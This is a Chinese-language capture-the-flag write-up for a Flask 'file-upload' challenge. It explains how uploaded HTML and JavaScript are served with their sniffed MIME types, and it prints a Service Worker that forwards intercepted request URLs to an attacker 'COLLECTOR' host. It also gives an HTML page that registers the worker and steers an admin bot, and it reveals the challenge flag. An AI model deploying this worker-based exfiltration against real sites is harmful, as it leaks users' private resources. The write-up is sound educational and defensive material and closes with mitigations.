# file-upload

## 题目简述

题目由两个 Flask 应用组成：主站负责给每个会话保存上传文件并提供 `/open_file?id=...` 跳转；查看站负责从共享的 `uploads` 目录取文件，以 `file -b -i` 的识别结果作为响应的 MIME 类型原样返回。主站还会把提交的 URL 交给已经登录为 `admin` 的浏览器机器人访问。

关键点不在传统的文件覆盖或路径穿越，而在“上传文件会在独立 origin 以其真实 MIME 类型执行”。上传内容虽没有扩展名，但 HTML 的 `<!DOCTYPE html>` 和带解释器 shebang 的 JavaScript 仍会被 `file` 正确识别。攻击者可以据此在查看站 origin 部署页面和 Service Worker。管理员访问攻击页面后，页面诱使其跳转到主站的 `/open_file?id=1`；该请求会按管理员会话中的上传列表重定向回查看站，因此 Service Worker 能观察最终请求并把目标 URL 发往自己的收集端。

## 解题过程

### 关键观察

主站仅以当前 Flask session 的哈希作为文件名前缀，`/open_file` 用数组下标选择该 session 的上传文件：

```python
@app.route('/open_file')
def open_file():
    file_id = int(request.args.get('id')) - 1
    return redirect(f"{os.getenv('PORT_5000_URL')}/{get_uploads()[file_id]}")
```

机器人拥有 `admin` session；所以它跳转时读取的是管理员的文件列表，而不是攻击者的列表。查看站没有把文件强制下载，也没有 CSP 阻止 Worker：

```python
mime_type = subprocess.run(
    ['file', '-b', '-i', safe_path], stdout=subprocess.PIPE
).stdout.decode().strip()
resp = Response(file_data, mimetype=mime_type)
```

Worker 的 scope 受 origin 约束，不能截获主站上的初始 `/open_file` 请求；但浏览器跟随 302 到查看站时会进入该 Worker 的 scope。这正是跨站跳转仍可泄露管理员文件 URL 的原因。

### 利用链

先在主站建立自己的 session，然后上传两个文件。第一个是能被识别成 JavaScript 的 Service Worker；`COLLECTOR` 是攻击者可接收请求的地址，长期 WP 中不写临时地址。

```javascript
#!/usr/bin/nodejs
self.addEventListener('fetch', (event) => {
  const response = fetch(event.request);
  fetch(`${COLLECTOR}/${encodeURIComponent(event.request.url)}`);
  event.respondWith(response);
});
```

第二个文件是 HTML。它从同一查看站 origin 注册刚上传的 Worker，注册完成后跳转到主站的固定入口：

```html
<!doctype html>
<script>
navigator.serviceWorker.register('WORKER_UPLOAD_URL').then(() => {
  location = 'MAIN_APP_URL/open_file?id=1';
});
</script>
```

将 HTML 文件的查看站 URL 提交给 `/report`。机器人访问后完成注册并带着 `admin` cookie 请求主站；主站把 `id=1` 解析为管理员第一份上传文件，再把浏览器重定向到查看站。Worker 报告的请求 URL 即管理员文件的直接 URL；读取该文件即可得到 flag。

### 验证

验证重点是收集端确实收到查看站 origin 的管理员文件请求，而不是攻击者自己的上传 URL。题目源码给出的该文件内容最终包含：

```text
DUCTF{what_the_javascript_36c66a87dc64c3c591202}
```

## 方法总结

- 核心技巧：将可执行上传、跨 origin 重定向与 Service Worker 的 fetch 事件结合，观察管理员私有文件的最终跳转目标。
- 识别信号：上传文件由服务端内容识别 MIME、用户文件被不同 origin 直接呈现、且有管理员 URL 访问机器人时，应检查能否上传 HTML/JS 和注册 Worker。
- 复用要点：Worker 不能越过同源边界；利用时必须让目标请求最终落回 Worker 所在 origin。对上传服务应强制安全下载、隔离不可信内容，并禁止其注册 Service Worker。
